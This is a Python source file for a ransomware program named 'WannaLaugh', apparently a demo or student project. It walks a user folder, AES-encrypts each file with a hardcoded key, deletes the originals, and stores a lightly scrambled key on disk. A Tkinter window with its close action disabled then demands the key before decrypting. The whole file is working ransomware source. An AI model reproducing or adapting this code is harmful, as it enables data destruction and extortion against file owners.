
def substitute(key):
    temp=''
    for i in key:
        temp+=chr(ord(i)+3)
    return temp

def reverse(key):
    temp = key
    return temp[::-1]


def substitute1(key):
    temp=''
    for i in key:
        temp+=chr(ord(i)-3)
    return temp


def scrmbl(key):
    temp = substitute(key)
    temp = reverse(temp)
    return temp

def dscrmbl(key):
    temp = substitute1(key)
    temp = reverse(temp)
    return temp 




###############################################################################
def encrypt():
    import pyAesCrypt
    import os

    # encryption/decryption buffer size - 64K
    bufferSize = 64 * 1024

    try:
        #print(1)
        key = "UorUJ2ivgwu2a8L7AWuB4nm6f2kXhy7C"
        with open(".key.txt", "w") as fileW:
            fileW.write(scrmbl(key))
        

    except:
        #Checking if it is already been executed
        #print("Already nuked")
        quit()

    # encryption
    def aesEncrypt():
        encryptThis = target     #target
        global encryptDone 
        encryptDone = str(encryptThis + ".lock")
        pyAesCrypt.encryptFile(encryptThis, encryptDone, key, bufferSize)


    def destroyOriginal():
    #removing the plain text key file immediately after usage
        if os.path.exists(target):
            os.remove(target)
        else:
            pass

    #Setting the target path "My Documents"
    targetPath = os.path.expanduser('~\\nukeMe')
    rootdir = os.path.expandvars(targetPath)

    #rootdir = "C:\Users\hp\nukeMe"

    #Encrypting files in My Documents WINDOWS
    for subdir, dirs, files in os.walk(rootdir):
        for file in files:
            try:
                target = rootdir + "\\" + str(file)
                #print(target)
                aesEncrypt()   
                destroyOriginal()
                #break
            except:
                pass


##################################################################################

def decrypt():
    import pyAesCrypt
    import os
    #from WannaLaugh.gui.guiWL import keyVal

    # encryption/decryption buffer size - 64K
    bufferSize = 64 * 1024

    try:
        with open(".userGivenKey.txt", "r") as fileRef:
            #print(1)
            keyList = fileRef.readlines()
            key = keyList[0]

    except:
        #print("Wrong key")
        pass
        #Checking if it is already been executed
        # quit()

    #decryption
    def aesDecrypt():
        decryptThis = target
        pyAesCrypt.decryptFile(decryptThis, decryptOutput , key, bufferSize)
        #print("decrypt me ", decryptThis)
        #print(key)

    def destroyEncrypted():
    #removing the plain text key file immediately after usage
        if os.path.exists(target):
            os.remove(target)
        else:
            pass

    #Setting the target path "My Documents"
    targetPath = os.path.expanduser('~\\nukeMe')
    rootdir = os.path.expandvars(targetPath)
    #print(rootdir)
    #targetPath2Raw = R"C:\Users\$USERNAME\nukeMe"


    #Decrypting files in My Documents WINDOWS
    for subdir, dirs, files in os.walk(rootdir):
        for file in files:
            try:
                target = rootdir + "\\" + str(file)
                decryptOutput = target.replace('.lock','')
                aesDecrypt()   
                destroyEncrypted()
            except:
                pass


#############################################################################

from tkinter import *
import os



    #using from tkinter.ttk  import * , breaks the button-background on windows. So removed the Style part for now
def gui():


    art = """

██╗    ██╗ █████╗ ███╗   ██╗███╗   ██╗ █████╗     ██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗
██║    ██║██╔══██╗████╗  ██║████╗  ██║██╔══██╗    ██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║
██║ █╗ ██║███████║██╔██╗ ██║██╔██╗ ██║███████║    ██║     ███████║██║   ██║██║  ███╗███████║
██║███╗██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══██║    ██║     ██╔══██║██║   ██║██║   ██║██╔══██║
╚███╔███╔╝██║  ██║██║ ╚████║██║ ╚████║██║  ██║    ███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                                            

"""
    text = """
   ____     __            __  __         __           
  / __/__  / /____ ____  / /_/ /  ___   / /_____ __ __
 / _// _ \/ __/ -_) __/ / __/ _ \/ -_) /  '_/ -_) // /
/___/_//_/\__/\__/_/    \__/_//_/\__/ /_/\_\\__/\_,  / 
                                               /___/  
                                   
"""

    borderScreen = """
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)                                                                 (_ ___)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)                                                                 (_ ___)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)                                                                 (_ ___)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)                                                                 (_ ___)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
( _ __)                                                                 ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
    """


    musiclLogo = """
                     |\                         
____|\_______________|\\___
____|/___3_|________@'_\|__|
___/|____-_|____________|__|
__|_/_\__4_|___|_______@'__|
___\|/_____|___|___________|
    /         O'  created by us
"""



    bgVal = "#000000"
    fgVal = "#D2BF55"

    root = Tk()
    root.configure(background=bgVal, height = 700, width = 820)
    root.resizable(FALSE, FALSE)    #resizing turned off

    #Prevent using alt + F4 close

    def onClose():
        pass
    root.protocol("WM_DELETE_WINDOW", onClose)

    #If the entered key is right this popUP msg will be triggered.
    #KEY CHECK HAS NOT BEEN IMPLEMENTED YET

    def popupmsg(msg):
        popup = Tk()
        popup.configure(background=bgVal, height = 200, width = 200)
        popup.resizable(FALSE, FALSE)
        popup.eval('tk::PlaceWindow %s center' % popup.winfo_pathname(popup.winfo_id()))
        label = Label(popup, text=msg, font= ('TkFixedFont', 10, 'bold'),background=bgVal, foreground= fgVal)
        label.pack(side="top", fill="x", pady=10)
        B1 = Button(popup, text="Okay", font = ('TkFixedFont', 10, 'bold'), command = popup.destroy, background=fgVal, foreground=bgVal)
        B1.pack()
        popup.mainloop()

    #sets the window in center of the screen
    root.eval('tk::PlaceWindow %s center' % root.winfo_pathname(root.winfo_id()))

    #removes title bar and removes the ability to close the application from task bar
    #root.overrideredirect(True)

    #accepting key
    def keyCatch():
        #print(keyAccept.get())
        popupmsg("Files will be extracted")

    #storing user input in a text file : userGivenKey

    def keyVal():
        keyValue = keyAccept.get()
        #print(keyValue)
        userFile = open(".userGivenKey.txt", "w+")
        userFile.write(keyValue)
        userFile.close()

        with open(".key.txt", 'r') as readKey:
            if dscrmbl(readKey.readline()) == keyValue:
                decrypt()
                exit()
    
        
    def esc():
        root.destroy()
    #Banner WannaLaugh
    Label(root,text=art, font='TkFixedFont', background=bgVal, foreground=fgVal).place(relx=.505, rely=.13, anchor="center")

    #Border design
    Label(root, text = borderScreen, font = 'TkFixedFont', background=bgVal, foreground= fgVal).place(relx=.5, rely=.5,anchor="center")

    #Enter the key TEXT
    Label(root, text=text, background=bgVal, foreground="#55DBCB", font = "TkFixedFont").place(relx=.5, rely=.45, anchor="center")

    #Music Logo
    Label(root,text=musiclLogo, font='TkFixedFont', background=bgVal, foreground="#55DBCB").place(relx=.14, rely=.9, anchor="center")

    #Accepting input : 
    keyAccept = Entry(root, font = ('TkFixedFont', 10, 'bold'), foreground = "black", background = fgVal, borderwidth = 0, width = 50, justify = CENTER)
    keyAccept.place(relx=.5, rely=.54, anchor="center")

    #Button
    submitBtn = Button(root, text=" Enter ", font = ('TkFixedFont', 10, 'bold'), command=keyVal, background=fgVal, foreground=bgVal, borderwidth = 0) 
    submitBtn.place(relx=.5, rely=.6, anchor="center")

    #Close button
    escBtn = Button(root, text=" Close ", font = ('TkFixedFont', 10, 'bold'), command=esc, background=fgVal, foreground=bgVal, borderwidth = 0) 
    escBtn.place(relx=.5, rely=.8, anchor="center")

    #playing music
    #winsound.PlaySound(".\\extras\\Goosebumps.wav", winsound.SND_ALIAS | winsound.SND_LOOP + winsound.SND_ASYNC)
    root.mainloop()

        



##############################################################################

if __name__ == "__main__":
    encrypt()
    gui()










